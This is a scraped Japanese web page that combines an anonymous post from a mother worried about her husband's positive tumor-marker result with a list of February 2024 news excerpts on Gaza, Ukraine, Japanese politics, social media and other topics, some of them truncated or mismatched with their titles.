夫はわからないが私は日常生活に支障がでるレベルで落ち込んでいる。

幼稚園と0歳の子が3人いる。

夫の家系に癌の方もいた。

なにかにすがりたい。

精密検査の結果まで耐えられない、辛い。

子ども達の成人した姿を夫と一緒にみれると信じていた。

生活すれ違ったり、私の復職でかなり夫と揉めたこともあって、夫ともうやっていけないのかわからない時もあったけどどうでもいいや。

医者になんでもなかった、結果は大丈夫だったといって欲しい。

夫と子ども達が健康なら本当に何もいりません。

本当にいらないんです。

夫がどんな気持ちで不安なのかを知りたい。

何も話さない人だから。

話すと怖くなるよね。

どうすれば良いかな。

ツイートシェア
Title: 夫が腫瘍マーカーで陽性だった

Link: https://dime.jp/genre/1736556/
Content: 「Xの親戚」として知られるBluesky。招待制がなくなり、誰でもこのSNSのユーザーとして登録できるようになった。

旧Twitterの共同創業者ジャック・ドーシー氏が携わっているSNSなのだから、そのデザインが旧Twitterに酷似しているのは当然といえば当然である。しかし旧Twitterや今のXとは違い、「見たい情報だけを見たい」ということが徹底されているようだ。

今回は、筆者が実際にBlueskyを使ってみた上で「Xとの違い」について考察していきたいと思う。

Blueskyの「フィード」とは？

Blueskyは「分散型SNS」と言われている。

この「分散型」の意味は、1回聞いただけでは全く読み取れないだろう。一方でXは「集中型SNS」だそうだが、それですらこの分野に詳しくない人にとっては意味不明である。

これを、どう分かりやすく伝えるべきか。

とりあえず、XになくてBlueskyにある概念を探してみよう。すると突き当たるのが「フィード」である。

このフィードは自分でも作ることが可能なのだが、要は「ある特定の条件に基づいたポストの集合体」である。

たとえば「Most Liked Steam Posts」という題のフィードをフォローする。このフィードは、ゲーム配信プラットフォームのSteamに関するポストだけを集めたものだ。そして次に「ビデオゲーム」というフィードもフォロー。すると自分のタイムラインには、

・フォロー中のユーザーのポスト

・「Most Liked Steam Posts」がまとめたポスト

・「ビデオゲーム」がまとめたポスト

しか表示されなくなる。Xのように「自分はフォローしてない人、しかも関心のないテーマのポスト」が飛び込んでくることは、Blueskyではぐっと少なくなる。

もちろん「フォロー中のユーザーがリポストした内容」はタイムラインに流れてくるが、少なくとも「どうしてこんな投稿が自分のタイムラインに？」ということは起こりづらくなりそうだ。

「嫌いなインフルエンサー」のポストを回避

サーバーをSNSの運営者以外にも各ユーザーが管理できるようにするというのが「分散型SNS」と呼ばれる所以であるが、実際に使ってみるとなかなかどうして心地が良い。

筆者自身、誰とは言わないが「嫌いなインフルエンサー」はいる。

もちろん、その人をフォローすることは絶対にしない。しかし、そのポストが筆者のタイムラインに流れてくる。Blueskyならそのような心配は無用、というわけだ。

趣味に徹するためのSNSとして、BlueskyはXの対抗馬になり得るのではないか。運営者による「特定の投稿の押しつけ」を極力避けているのがBluesky、と表現すれば妥当か。

そしてBlueskyをしばらくいじっていると、今のXの欠点がまざまざと見えてくるのだ。
Title: Xの対抗馬として注目されるBlueskyを使ってわかった分散型SNSの魅力｜@DIME アットダイム

Link: https://news.yahoo.co.jp/articles/c24904b60c5e51ab6c443c8f6e69d3d834a49f96
Content: 空前の医学部ブームの韓国、定員拡大で混乱中…医者は猛反対、高齢化で人材不足だが関心は「カネと名誉」の本末転倒

JBpress 2/18(日) 11:02
Title: ナワリヌイ氏遺体にあざ　死亡時刻、証言と不一致　ロシア紙（時事通信） - Yahoo!ニュース

Link: https://news.yahoo.co.jp/pickup/6492030
Content: 1696 コメント 1696 件

海外で高級腕時計を買い付ければ、報酬がもらえる――。 コロナ禍の海外渡航の規制が落ち着いた時期から募集が始まった、そんな不思議な「仕事」を巡り、トラブルが相次いでいる。参加者たちには、3千万円を超えるクレジットカードの債務を抱えた人もおり、一部は集団で弁護士に対応を相談している。
Title: 腕時計買い付け 報酬巡りトラブル - Yahoo!ニュース

Link: https://www3.nhk.or.jp/news/html/20240219/k10014362951000.html
Content: このコンテナ輸送の新しい技術は、生鮮食品を凍らせずに生の状態のまま船で運ぶチルド輸送の日数を、大幅に伸ばすことができるのが特徴です。



温度を管理したコンテナの内部に電圧をかけて「電場」と呼ばれる状態にし、食品に含まれる水の分子を回転させることで、鮮度を保ちながら腐敗の進行を抑える仕組みです。



従来のチルド輸送と比べて、多くの食品で輸送期間を2倍から3倍に伸ばすことができるとしていて、例えば豚肉の場合、従来の20日程度から60日程度に、魚のぶりの場合は、これまで空輸が中心でしたが、船での輸送が可能になるとしています。



住友商事は、香港の大手海運会社OOCLとの間で近く業務提携を結び、導入を進める方針です。



会社によりますと商用化は世界で初めてで、大手食肉加工メーカーがスペインからの豚肉の輸入に使うことを決めているということです。



紅海をう回する海上輸送によって輸送コストの上昇が課題となっていますが、会社は商品の価格へのコストの転嫁を抑えることが期待できるとしています。



住友商事の物流インフラ事業本部梁井崇史 本部長は「われわれとしては非常に大きな影響があるので、船会社や物流会社と相談しながらできるだけスムーズに物を届けることを考えていかなければならない」と話していました。
Title: 住友商事 生鮮食品のコンテナ輸送 長期化できる新技術導入へ | NHK

Link: https://www3.nhk.or.jp/news/html/20240219/k10014363371000.html
Content: 盛山文部科学大臣は、前回の衆議院選挙の際、旧統一教会の関連団体の集会に出席して推薦状を受け取り、選挙の支援を受けていたなどとする指摘が出ています。



これを受けて、立憲民主党は、19日昼すぎ、国会内で臨時の執行役員会を開き、泉代表や岡田幹事長、それに安住国会対策委員長らが対応を協議しました。



そして午後1時前に、盛山大臣に対する不信任決議案を衆議院に提出しました。



決議案では「宗教法人を所管する文部科学省は旧統一教会の解散命令を請求しており、教団と密接な関係にある盛山大臣が、国民から疑念を抱かれずに公正な審理を進めることは不可能だと断ぜざるをえない。国会では『記憶にない』と不誠実な答弁を繰り返しており、文部科学大臣の任に堪えない」としています。



決議案は、20日の衆議院本会議で採決される見通しです。
Title: “旧統一教会側 選挙支援”盛山文科相に不信任案提出へ 立民 | NHK

Link: https://mainichi.jp/articles/20240217/k00/00m/040/043000c
Content: 自宅に山積みになった資料の中を歩く森下弘さん＝広島市佐伯区で2024年2月9日、中川祐一撮影

平和都市のトップが職員に説いているのは、軍国主義教育の精神的支柱とされた「教育勅語」だった。「びっくりしたし、あきれた」。戦後日本が掲げてきた国民主権との落差に憂慮の念は深い。

「広島原爆の日に平和宣言を読み上げる市長が持ち出すなんて考えられもせん」。高校教諭として広島で長年教べんを取り、平和教育にも携わってきた森下弘（ひろむ）さん（93）＝広島市佐伯区＝は嘆く。

広島市の松井一実市長は新規採用職員の研修で教育勅語の一部を使って講話をしていたことが2023年末に明らかとなり、物議を醸した。「爾（なんじ）臣民、兄弟に友に、博愛衆に及ぼし、学を修め……」。就任翌年の12年から毎年、研修用の配付資料で、天皇が「臣民」に博愛や勉学・就業、知識啓発などを説く部分を抜粋・引用している。

森下さん自身、軍国少年だった。…
Title: ヒバクシャ：「驚きあきれた」平和都市市長の教育勅語引用　元軍国少年の憂い | 毎日新聞

Link: https://www3.nhk.or.jp/news/html/20240219/k10014363121000.html
Content: イスラエル軍は南部ハンユニスにあるナセル病院でハマスの戦闘員が活動し、人質の遺体が残されている可能性があるなどと主張して、今月15日に突入し、18日も作戦を続けました。



イスラエル軍はナセル病院内で武器を発見したと発表しているほか、ガラント国防相もこれまでにハマスの戦闘員およそ70人を病院での作戦で拘束したと発言しています。



これに対しガザ地区の保健当局は70人が拘束され、いずれも医療スタッフだとしているほか、病院が停電して酸素の供給ができなくなったためすでに8人の患者が死亡し、さらに数十人が死亡するおそれがあるとしていて、危機的な状況が続いているとみられます。



WHO＝世界保健機関のテドロス事務局長は、18日、SNSへの投稿で「ナセル病院は1週間におよぶ包囲と今も続く作戦により、もはや病院として機能していない。病院にはおよそ200人の患者がいて、少なくとも20人は緊急に転院して治療を受ける必要がある。遅れれば患者たちの命が失われることになる」として、一刻も早い患者の転院が必要だと訴えています。



ガザ地区では各地で空爆も続いていて、ガザ地区の保健当局は18日、過去24時間で127人が死亡し、これまでの死者は2万8985人にのぼったとしていて、住民の犠牲に歯止めのかからない状況が続いています。



こうした中、ブラジルのルーラ大統領は18日、イスラエルが軍事作戦を続けているガザ地区の状況について、かつてユダヤ人を虐殺したナチス・ドイツのヒトラーを引き合いに出して「戦争ではなく集団虐殺だ」と非難しました。



これに対してイスラエルのネタニヤフ首相は「ルーラ大統領はイスラエルによるハマスとの戦いをホロコーストと比べ、虐殺された600万人のユダヤ人の記憶をおとしめ、ユダヤ人国家を悪者にした。恥を知るべきだ」と述べ、強く反発しました。
Title: ガザ地区南部ハンユニスの病院 8人死亡 イスラエル軍が突入 | NHK

Link: https://www.cnn.co.jp/world/35215423.html
Content: パレスチナ自治区ガザ地区南部にあるナセル病院が、イスラエル軍の攻撃を受けて機能不全に陥ったという/Abed Zagout/Anadolu Agency/Getty Images

（ＣＮＮ） 世界保健機関（ＷＨＯ）は、パレスチナ自治区ガザ地区南部のナセル病院がイスラエル軍の攻撃を受けて機能不全に陥ったと発表した。ナセル病院は、ガザ地区で残って機能し続けていた中で最大の病院だった。

ＷＨＯのテドロス・アダノム事務局長がＸ（旧ツイッター）に掲載した声明によると、ＷＨＯの職員は１６日も１７日もナセル病院への立ち入りを許可されず、患者の状況や緊急医療ニーズについては把握できていないという。

「同病院にはまだ２００人ほどの患者がいる。少なくとも２０人は緊急に別の病院に転院して治療を受ける必要がある。転院は全ての患者にとっての権利だ」とテドロス事務局長は指摘。「対応が遅れれば患者の命が代償になる」として危機感を募らせ、ＷＨＯ職員を患者と病院への対応に当たらせるべきだと訴えた。

イスラエル軍は、人質がナセル病院で拘束されていたことを裏付ける確かな証拠があると主張しているが、その証拠の内容は明らかにしていない。

ナセル病院は燃料や酸素や医療物資が不足して深刻な状況に陥っていた。１５日に始まったイスラエル軍の攻撃を前に、病院に身を寄せていた何百人もの民間人が、イスラエル軍によって強制的に退去させられていた。
Title: ガザに残された最大の病院、イスラエル攻撃で機能不全に

Link: https://www.cnn.co.jp/world/35215429.html
Content: （ＣＮＮ） フランスのマクロン大統領とエジプトのシーシ大統領は１７日、電話会談を行い、イスラエル軍によるパレスチナ自治区ガザ地区南部ラファへの侵攻について「断固反対」との立場を示した。仏大統領府が電話会談の内容を明らかにした。

マクロン氏とシーシ氏は電話会談で、ガザでのすでに壊滅的な人道的状況の悪化と、援助物資の搬入の障害に対する強い懸念を共有したほか、ガザへの支援物資の流入を急いで増やすことの必要性を強調した。

仏大統領府は声明で、マクロン氏とシーシ氏が、新たな人道的な大惨事につながりかねないイスラエル軍のラファへの侵攻について断固反対すると述べた。両首脳は、国際人道法に違反し、中東地域の状況激化の新たなリスクとなり得るエジプトへのガザ住民の強制移動にも断固反対するとした。

イスラエルはここ数週間、ラファへの空爆を実施している。ラファでの地上作戦についても、パレスチナの人々が北部に移動する余地はあるとして、実行する姿勢を示している。
Title: イスラエル軍のラファへの侵攻、仏・エジプトは「断固反対」

Link: https://www.bbc.co.uk/news/world-asia-68137582
Content: Despite the "clear frustration" over the outcome of the Alkonis case, Jeffrey Hall of the Kanda University of International Studies added: "There is a sense of resignation among many Japanese that their powerful American allies do not treat them as equals and never will. The Alkonis incident underlines that even when parties and presidents change in the United States, this sense of inequality persists."
Title: Ridge Alkonis: The sailor who stoked Japanese resentment against the US

Link: https://www.afpbb.com/articles/-/3496731
Content: 【2月18日 AFP】米国のホームレス問題の中心地となっているカリフォルニア州。ここでは、その厳しい状況を数字を用いて説明する。

■全米で最も深刻

先ごろ公表された米政府統計によると、全米の路上生活者人口の30％がカリフォルニア州に集中している。これはニューヨーク州の13％やフロリダ州の5％を大きく上回る数字だ。

カリフォルニア州全体の路上生活者人口は17万1000人で、サンフランシスコやサクラメント（Sacramento）といった大きな都市ではそれぞれ数千人単位となっている。中でも、ロサンゼルスの状況は最も深刻で、7万5500人が路上で生活している。

■低廉住宅

ホームレス問題の要因として考えられるものには、貧困、メンタルヘルス、さまざまな依存症などがあるが、専門家によると最も大きいのは、住宅の供給不足と法外ともいえる価格の高騰だ。

カリフォルニア州では長年にわたって住宅不足が続いている。これは環境保護を目的とした複雑な法令や、集合住宅よりも戸建てに有利な計画規制、さらには低価格住宅の建設を制限する規定などが影響している。

米国で最も貧困率が高いミシガン州デトロイト（Detroit）ですら、低価格帯住宅が数多く提供されているために、ホームレスの問題はそこまで深刻ではない。

■高齢

カリフォルニア州のホームレス問題を深刻化させているのは、温暖な気候や薬物に寛容な態度にひかれて他州から流入してくる移住者だとする見方がある。

しかし、カリフォルニア大学サンフランシスコ校（University of California at San Francisco）で社会的弱者の問題に取り組むマーゴット・クシェル（Margot Kushel）氏によると、路上生活者の約90％はもともと州内に住居があったことが最近の調査で分かっている。

また同州のホームレスの47％は50歳以上で、うち41％は50歳より前にホームレスを経験したことがなかった。

ホームレスになっているのは「生涯にわたって医療を受けることができていない人や、肉体的に非常に過酷な労働についていた人で、その多くは（社会的に）不利な立場にある」とクシェル氏は指摘する。
Title: 米カリフォルニア州のホームレス問題、数字で検証

Link: https://mainichi.jp/articles/20240218/k00/00m/010/076000c
Content: 毎日新聞は17、18の両日、全国世論調査を実施した。岸田内閣の支持率は、1月27、28日実施の前回調査（21％）より7ポイント減の14％で2カ月ぶりに下落し、岸田政権発足以来最低となった。岸田内閣の支持率が20％を切るのは、昨年12月以来2度目。不支持率は前回調査（72％）より10ポイント増の82％だった。

調査方法が異なるため、単純比較はできないが、内閣支持率14％は、2009年2月の麻生内閣（11％）以来の低い水準。また、不支持率が80％を超えるのは、毎日新聞が世論調査で内閣支持率を初めて質問した1947年7月以来、初めて。

Advertisement

支持率は、マイナンバーカードを巡るトラブルが相次いだことなどが影響して昨年6月以降、下落傾向に転じ、9月に内閣改造を実施するなどしたが、政権浮揚にはつながらなかった。11月以降、自民党派閥の政治資金パーティーを巡る裏金問題が深刻化。今年1月は20％台を回復したが、再び下落した。

調査は、携帯電話のショートメッセージサービス（SMS）機能を使う方式と、固定電話で自動音声の質問に答えてもらう方式を組み合わせ、携帯453件、固定571件の有効回答を得た。固定については、能登半島地震で大きな被害が出ている石川県の一部地域を調査対象から外した。【野原大輔】

ポッドキャストでも配信中

三沢編集長補佐と元政治部記者で世論調査室の野原大輔さんが毎日新聞ポッドキャスト「今夜、BluePostで」に登場。下に表示される音声プレーヤーの再生ボタンからお聞きください。利用されているブラウザーのCookie設定で、プレーヤーが表示されない場合があります。
Title: 岸田内閣支持率、最低14％　不支持率82％　毎日新聞世論調査 | 毎日新聞

Link: https://grandfleet.info/war-situation-in-ukraine/brigadier-general-tarnavsky-a-large-number-of-ukrainian-soldiers-were-taken-prisoner-during-the-evacuation-of-audiiivka/
Content: ウクライナ人が運営するDEEP STATEは17日「コークス工場を含むアウディーイウカ全体がロシア軍の支配地域になった」と報告、タブリア作戦軍司令官のタルナフスキー准将も「アウディーイウカからの撤退時に多数のウクライナ軍兵士が捕虜になった」と明かした。

参考：Мапу оновлено!

参考：При выходе из Авдеевки некоторое количество бойцов попало в плен, – Тарнавский

市内からは「捕虜になったウクライナ兵士」や「路地に横たわるウクライナ兵士の遺体」の様子が報告されている

ウクライナ人が運営するDEEP STATEは17日に更新した戦況マップの中で「コークス工場を含むアウディーイウカ全体がロシア軍の支配地域になった」と報告、視覚的にもロシア軍がコークス工場＝Ⓐで国旗を掲げる様子、アウディーイウカ駅＝Ⓑで国旗を掲げる様子、アウディーイウカ市議会＝Ⓒで国旗を掲げる様子、第9地区のカルチャーセンター＝Ⓓで軍旗（？）を掲げる様子が確認されている。

タブリア作戦軍司令官のタルナフスキー准将は17日「アウディーイウカからの撤退は『様々なシナリオ』と『作戦状況の変化』を考慮した計画に基づいて実施されたが、敵の優勢な圧力を受けて多数のウクライナ軍兵士が捕虜になった」と明かし、掃討戦に移行したアウディーイウカ市内からは「捕虜になったウクライナ兵士」や「路地に横たわるウクライナ兵士の遺体」の様子も報告されている。

アウディーイウカ市内には「3,000人～5,000人のウクライナ軍兵士が存在した」という指摘があり、わざわざタルナフスキー准将が「多数のウクライナ軍兵士が捕虜になった」と予防線を貼るくらいなので、撤退できなかった兵士の数は「四桁に届きそうな三桁後半」なのかもしれない。

関連記事：ロシア軍勝利で決着、シルスキー総司令官がアウディーイウカ撤退を発表

関連記事：アウディーイウカは酷い状況、ウクライナ軍兵士が撤退している可能性も

関連記事：第3独立強襲旅団、甚大な損害を与えてもアウディーイウカの状況は厳しい

関連記事：ロシア軍、ゼレンスキー大統領が自撮りを行ったモニュメントに軍旗を掲げる

関連記事：第3独立強襲旅団、アウディーイウカで対峙するロシア軍は正規軍の精鋭

関連記事：アウディーイウカ南部の防衛ラインが崩壊、街の入口にもロシア国旗が掲げられる

関連記事：アウディーイウカ市内でのロシア軍前進は衰えず、複数方向で支配地域を拡大

関連記事：アウディーイウカ市街は包囲寸前、ロシア軍が北西郊外に支配地域を広げる

関連記事：ウクライナメディア、アウディーイウカは壊滅的な状況に近づいている

関連記事：ロシア軍がアウディーイウカ分断に成功した可能性、敵装甲車が幹線道路に到達か

関連記事：アウディーイウカにウクライナ軍の予備戦力が到着、第110旅団の一部と交代

関連記事：危機的なアウディーイウカ、ウクライナ軍は夏に何も準備してこなかった

※アイキャッチ画像の出典：Кирилл Фёдоров / Война История Оружие
Title: タルナフスキー准将、アウディーイウカ撤退時に多数のウクライナ軍兵士が捕虜になった

Link: https://www.cnn.co.jp/world/35215414.html
Content: （ＣＮＮ） イスラエル国防省は１８日までに、パレスチナ自治区ガザ地区のイスラム組織「ハマス」が昨年１０月７日に起こしたイスラエルへの奇襲に関与した疑いがあるとする国連パレスチナ難民救済事業機関（ＵＮＲＷＡ）の職員１２人の身元の詳細を公表した。

氏名、写真やハマスでの役割などを明らかにした。社会福祉事業担当者と数学担当の学校教師とする２人に関しては１０月７日にイスラエル内にいたとし、関連の画像も公開した。

ハマスのメンバーと主張する残りの１０人については、身元を示す写真、肩書や奇襲に加担したとする行動などを公にした。

ただ、奇襲に加わったとする主張を裏づけるほかの証拠には一切言及しなかった。ＣＮＮはイスラエル側の今回の発表内容の真偽を独自に検証できていない。

ＵＮＲＷＡの報道担当者は、職員による奇襲への関与疑惑については国連で最高位の調査権限を持つ部門が調べているとし、イスラエルによる身元の詳細とする情報へのコメントは避けた。

ガザで活動するＵＮＲＷＡ職員は約１万３０００人とされる。奇襲への関与疑惑が浮上した後、十数カ国が同機関への活動資金の拠出を停止する影響が出ていた。

ＵＮＲＷＡは疑惑が表面化した後、１２人のうちの１０人を即座に解雇し、真相を見極める調査にも着手した。国連によると、イスラエルが奇襲への加担を主張した残る２人の職員は死亡した。
Title: ＵＮＲＷＡ職員の奇襲への関与疑惑、身元詳細を公表　イスラエル

Link: https://mainichi.jp/articles/20240218/k00/00m/040/183000c
Content: 「ラファに手を出すな」――。

東京・JR新宿駅前で18日、学生らの呼びかけで集まった若者らがパレスチナ自治区ガザ地区への攻撃を続けるイスラエルに抗議の声を上げた。

ガザ地区をめぐってはイスラエルのネタニヤフ首相が、多数の避難民が滞在する南部ラファへの侵攻を明言し、緊張が高まっている。主催者によると約2000人が集まり、「今すぐ停戦を」と訴え、平和を願った。【和田大典】
Title: 「ラファに手を出すな」　イスラエルのガザ攻撃に抗議　新宿 | 毎日新聞

Link: https://forbesjapan.com/articles/detail/69199
Content: SNSの微博も「中国経済の悪口を言うな」とユーザーに警告

日本で金価格が爆上がり中 政府・日銀の「円安放置」で高まる価値

中国とバフェットが高笑いし、労働者があえぐ国ニッポン

「超大国」を目指す中国の試みは失敗に終わる その理由

中国を襲う「因果応報」 対オーストラリア高関税で代償払う

Forbes JAPANの最新のニュースをお届けします

続きを読むには、会員登録（無料）が必要です

無料会員に登録すると、すべての記事が読み放題。

著者フォローなど便利な機能、限定プレゼントのご案内も！

会員の方はログイン
Title: 時価総額1000兆円消失すらかすむ、中国から届いた「最悪のニュース」 | Forbes JAPAN 公式サイト（フォーブス ジャパン）

Link: https://www.afpbb.com/articles/-/3504755
Content: この写真にはショッキングな表現、または18歳以上の年齢制限の対象となる内容が含まれます。 ご覧になる場合にはご了承の上、クリックしてください。

【2月16日 AFP】ロシアによる侵攻開始後、直ちに軍に志願したウクライナ人のイワン・ザドンツェウさん（27）は、紛争が3年目に突入しようとする今、疲弊しきっていた。

「ただ怒りしか感じない。いつまで続くのか」。ザドンツェウさんは第24独立突撃大隊の報道将校としてAFPの取材に応じた。「われわれは全員、疲れ果てている。皆、休息を望んでいる。とにかく交替させてほしい！」

兵士の疲労と休息の必要性を訴える声は、さらなる兵員補充を求めるウクライナ軍上層部にジレンマをもたらしている。志願兵数が伸び悩む一方で、追加動員法案は政治的窮地にあり、政府にも身動きする余地がない。

空挺攻撃部隊の中隊を率いるセルヒー・オゴロドニクさん（39）は「兵士たちには休みが必要だ。回復して戦闘を継続するためだけはなく、市民として生活を再建するための時間も要る」と語った。兵士たちの間では、応召していない人々に対する「不公平感」が渦巻いているという。

紛争終結が見通せない中、ウクライナ軍は十分な人員の確保に苦慮している。徴兵を容易にし、前線の兵士に休息を与えることを目的とした追加動員法案は、現在激しい議論の的となっている。

戦線の停滞によって、志願を考えている人々の勢いも冷め気味だ。

ウクライナ軍が2022年当初掲げていた同年内の勝利は実現せず、昨年の待望の反転攻勢でもロシア軍を打破できなかった。

首都キーウの理容師ダニールさん（27）は1年前なら入隊を考えたかもしれないが、今は違うと言う。「当時はある種の熱狂があり、誰もがうまくいくと思っていた。すべて解決し、勝利を取り戻せると… だが、今はみんなもっと現実的だ」

キーウ国際社会学研究所（KIIS）のアントン・グルシェツキー（Anton Grushetsky）氏は、米議会内の対立が西側の支援の足かせとなり、先行きが不透明なことも影響しているとみている。

「強力な支持を受けていると感じていた時には、ウクライナ人は戦場で死ぬ覚悟ができていた。だが、戦うための武器がないと知れば、戦意は喪失する」

さらにウクライナ政府の一連の汚職の暴露は、志願を迷っているダニールさんのような人々をいっそう落胆させた。
Title: 疲弊するウクライナ軍、兵員補充にも苦慮 侵攻2年

Link: https://www.afpbb.com/articles/-/3505578
Content: 【2月18日 AFP】ウクライナのウォロディミル・ゼレンスキー（Volodymyr Zelensky）大統領は17日、ドナルド・トランプ（Donald Trump）前米大統領が再選した場合のウクライナ支援継続が不安視される中、同氏を最前線に招待する用意があると述べた。

ゼレンスキー氏はドイツで開催されたミュンヘン安全保障会議（Munich Security Conference）で、為政者は本物の戦争とはどのようなものか知っておくべきだとして、「トランプ氏が（ウクライナに）来れば、最前線に連れて行く用意がある」と語った。

ゼレンスキー氏は英語で演説し、「この戦争をいかにして終わらせるかを協議するなら、インスタグラムを通じてではなく、本物の戦争がどのようなものかを為政者に見せなければならないと思う」と訴えた。

米議会で昨年以来、党派間の対立により600億ドル（約9兆円）規模の対ウクライナ軍事支援がまとまらないなど、西側諸国による支援の長期的見通しは不透明となっている。

ジョー・バイデン（Joe Biden）大統領の対ウクライナ支援に反対を表明しているトランプ氏が返り咲く可能性があることも、米国の支援継続の行方に暗い影を落としている。(c)AFP
Title: ゼレンスキー氏、最前線にトランプ氏招待の用意 「本物の戦争」見せたい

Link: https://jp.reuters.com/world/china/NUAQL4Y7SZK5JDJNJRUGCMP5QQ-2024-02-17/
Content: 中国では経済の停滞に伴い、若者は就職や労働を通じた将来の見通しがききにくくなっている。そうした中で、チュー・イさん（２３、写真）が選んだ道は「寝そべり族」だった。２月５日、チューさんの上海の自宅で撮影（２０２４年 ロイター/Nicoco Chan）

［上海 １５日 ロイター］ - 中国では経済の停滞に伴い、若者は就職や労働を通じた将来の見通しがききにくくなっている。そうした中で、チュー・イさん（２３）が選んだ道は「寝そべり族」。自分が楽しめる時間を過ごすのに必要なだけの稼ぎを得るため、最低限しか働かない人々のことだ。

チューさんはかつてアパレル関係の会社に勤めていたが、２年前に退職した。頻繁に残業しなければならない上、上司が嫌いだったからという。

今は在宅で旅行会社の仕事を週１日こなすだけ。そのおかげで、フルタイムのタトゥーアーティストになるための半年の見習いに入り、たっぷり練習できる時間を確保している。

寝そべり族はチューさんだけではない。どれだけの若者が従来のような会社勤めを放棄したのか、統計はないものの、マクロ経済がなお新型コロナウイルスのパンデミック前の成長軌道に戻れず、大学新卒者の間からは収入を得るために就職口で妥協を強いられたとの声が聞かれる中で、昨年６月時点でも若者の失業率は２１．３％と過去最悪に達していた。

「私にとって、働くことに大きな意味はない」とチューさんは言う。「大部分は上司のために仕事をやり遂げ、上司が喜ぶだけのように思える。だから（必死に）働かないと決めた」

中国でチューさんのように１９９５年から２０１０年に生まれた約２億８０００万人の「Ｚ世代」は、あらゆる年齢層で最も悲観的だ。

この半世紀近くで成長率が最低圏に落ち込んだ今、習近平体制にとってはＺ世代の不安をいかに和らげるかが重要な政策課題になっている。１月には人力資源・社会保障省が、今年は特に若者の雇用を増やす取り組みの強化が必要だと訴えた。

米ミシガン大学で社会学助教を務めるチョウ・ユン氏は、一部の若者は会社で出世するための激しい競争から進んで身を引いたように思えるが、彼らの将来に対する悲観主義を見過ごすことはできないと強調する。

チョウ氏は、中国では経済が減速し、労働市場は逼迫（ひっぱく）したままだと指摘。「社会格差が固定化され、政治的な統制強化が進み、経済の先行き期待が持てない今の中国は若者らにとって非常に生きづらくなっている」との見方を示した。

これら全ての要素が重なった結果、チューさんのような若者は自分の幸福や興味を充実させることを、会社で働くという「終わりなきプレッシャー」よりも大事に考えるようになった。

実際チューさんは、以前よりずっと幸せを感じており、自らの選択には「価値がある」と信じている。

「私の今の給料は、多いとは言えないが、毎日の生活費を賄える。自由な時間は、数千元のお金よりもはるかに貴い」。チューさんはそう話した。

私たちの行動規範：トムソン・ロイター「信頼の原則」 , opens new tab
Title: アングル：稼ぎより自分の時間優先、将来悲観する中国の「寝そべり族」

Link: https://toyokeizai.net/articles/-/734957
Content: 松屋｢290円モーニング｣でプチ落胆からの"感激" メニュー表より少ないが､やさしい味付けが最高

喫茶店やレストランが、朝の時間帯にドリンクやトーストなどのメニューを割安価格で提供するモーニングサービス。名古屋の喫茶店が始めた文化とされていますが、最近では大手外食チェーンも数多く提供しています。

そんなチェーン店の外食モーニングをこよなく愛するライター・ブロガー、大木奈ハル子さんがお届けする本連載。第64回となる今回、訪れたのは「松屋」です。

さまざまな外食チェーンで提供している朝限定メニュー。カフェやハンバーガーショップ、おそば屋さんなどはもちろんのこと、最近では焼肉店やラーメン店などでも独自のモーニングサービスを展開しています。

外食チェーンモーニングといえば、牛丼チェーンを思い浮かべる方も多いのではないでしょうか。なかでも玉子かけご飯や、目玉焼きなど、卵を使った朝メニューは定番として親しまれてきました。

そこに一石を投じる朝定食が「松屋」から登場しました。「スクランブルエッグ定食」と「得朝あんかけ玉子丼」全国58店舗限定で販売を開始。さっそくご紹介いたします。

松屋の朝メニュー

「松屋」のモーニングの販売時間は朝5時から11時まで。レギュラーメニューは6種類です。

・Wで選べる玉子かけごはん 税込290円

・得朝牛皿定食 税込380円

・ソーセージエッグ定食 税込450円

・豚汁朝定食 税込490円

・ソーセージエッグW定食 500円

・”炙り”焼鮭朝定食 税込630円

「松屋」のモーニングの最大の特色は、小鉢付きのメニューは「ミニ牛皿」「納豆」「国産とろろ」「冷奴」の4種類から自分で好きな小鉢を選べる点です。また、モーニングに限らず各種定食は、ライスの量を大盛・特盛にしても追加料金がかからないため、腹ペコのときは頼もしい限り。

インフレだ値上げだと逆風吹き荒ぶ昨今ですが、モーニングメニューの最安値「Wで選べる玉子かけごはん」は、現在も税込290円と300円以下を維持しており、お財布に優しい価格設定となっています。

「コンビニで菓子パン1個とペットボトルのジュース」と同じぐらいの価格で、玉子かけごはんにみそ汁と小鉢までついてくるというのは、ありがたい限りです。
Title: 松屋｢290円モーニング｣でプチ落胆からの"感激"

Link: https://shikiho.toyokeizai.net/news/0/509298
Content: コンテンツブロックが有効であることを検知しました。

このサイトを利用するには、コンテンツブロック機能（広告ブロック機能を持つ拡張機能等）を無効にしてページを再読み込みしてください。

✕
Title: ｢自民党への献金額が大きい上場企業｣ランキングTOP20｜会社四季報オンライン

Link: https://news.yahoo.co.jp/articles/0b438698fee47c1d47190ce0763494ea8be208a1
Content: 〈浜名湖・17歳遺体〉「ゴミもタバコもポイ捨て、騒音もひどい上に『なんだテメー』とからんでくる…」亡くなった元バレーボール少年が最後に訪れたのは不良少年たちの“巣”。遺体発見現場との接点は？

集英社オンライン 2/17(土) 20:55
Title: 岸田内閣支持率、最低14％　不支持率82％　毎日新聞世論調査（毎日新聞） - Yahoo!ニュース

Link: https://www.afpbb.com/articles/-/3505586
Content: 【2月18日 AFP】イスラエルのベンヤミン・ネタニヤフ（Benjamin Netanyahu）首相は17日、同国に対しパレスチナ自治区ガザ地区（Gaza Strip）最南端ラファ（Rafah）に侵攻しないよう求めることは、イスラム組織ハマス（Hamas）との「戦争に負けろ」と言うのも同然だと反発した。

ネタニヤフ氏は、昨年10月7日にイスラエルを攻撃したハマスを「壊滅」させると宣言しており、人質解放合意の有無にかかわらずラファに侵攻する構えを見せている。

ネタニヤフ氏は記者会見で、「たとえそれ（人質解放合意）が実現したとしても、ラファに入るだろう」と述べた。

約140万人が避難するラファ侵攻をめぐっては、最も緊密な同盟国である米国を含む各方面から思いとどまるよう求める声が高まっている。

イスラエル軍は、犠牲者を最小限に抑えるため、ラファからの民間人退避を進めていると主張しているが、避難計画の詳細は示していない。(c)AFP
Title: 「ラファ侵攻するな」は「負けろ」も同然 イスラエル首相

Link: https://toyokeizai.net/articles/-/729694
Content: 「日本中学生新聞」を一人で立ち上げ、注目を集めている少年がいる。現在、中学1年生の川中だいじさんだ。2023年4月に開始したX（旧Twitter）のフォロワーはすでに1万8000人を超え、新聞や週刊誌など大手メディアの取材も受けている。「中学生がつくった民主的な読み物」と銘打った自身の新聞のモットーは、「誰にも遠慮することなく 書きたいことを書く」。12歳にして自らメディアを作るに至った経緯や、中学生として今求めていることなどを、13歳になって間もない川中さんに聞いた。

東洋経済education × ICT編集部

会話も校内掲示も、「政治の話」を禁止された小学校時代

